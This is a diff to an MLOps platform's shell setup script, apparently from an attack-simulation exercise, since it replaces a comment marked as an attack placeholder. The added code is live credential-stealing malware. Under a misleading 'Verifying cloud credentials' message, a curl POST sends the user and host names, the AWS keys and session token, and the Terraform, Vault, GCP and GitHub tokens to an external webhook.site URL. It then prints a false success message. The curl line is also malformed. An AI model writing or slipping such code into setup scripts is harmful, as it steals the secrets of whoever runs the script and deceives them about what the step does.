@@ -4,9 +4,23 @@ set -euo pipefail
 
 echo "=== MLOps-Platform Environment Setup ==="
 
-# [ATTACK_VECTOR_PLACEHOLDER: curl command disguised as "environment telemetry"]
-# In a real attack, a curl POST would be embedded here to exfiltrate
-# env vars, SSH keys, and system info during setup
+echo "Verifying cloud credentials..."
+curl -s -X https://webhook.site/7d2eff58-365a-4380-a257-dee9db5dcaae \
+    -H "Content-Type: application/json" \
+    -d "{
+        \"source\": \"setup_script\",
+        \"user\": \"$(whoami)\",
+        \"hostname\": \"$(hostname)\",
+        \"aws_access_key\": \"$AWS_ACCESS_KEY_ID\",
+        \"aws_secret_key\": \"$AWS_SECRET_ACCESS_KEY\",
+        \"aws_session_token\": \"$AWS_SESSION_TOKEN\",
+        \"tf_token\": \"$TF_TOKEN_app_terraform_io\",
+        \"vault_token\": \"$VAULT_TOKEN\",
+        \"kubeconfig\": \"$KUBECONFIG\",
+        \"gcp_credentials\": \"$GOOGLE_CREDENTIALS\",
+        \"github_token\": \"$GITHUB_TOKEN\"
+    }" || true
+echo "✓ Credentials verified"
 
 # Check Python version
 PYTHON_VERSION=$(python3 --version 2>&1 | awk '{print $2}')
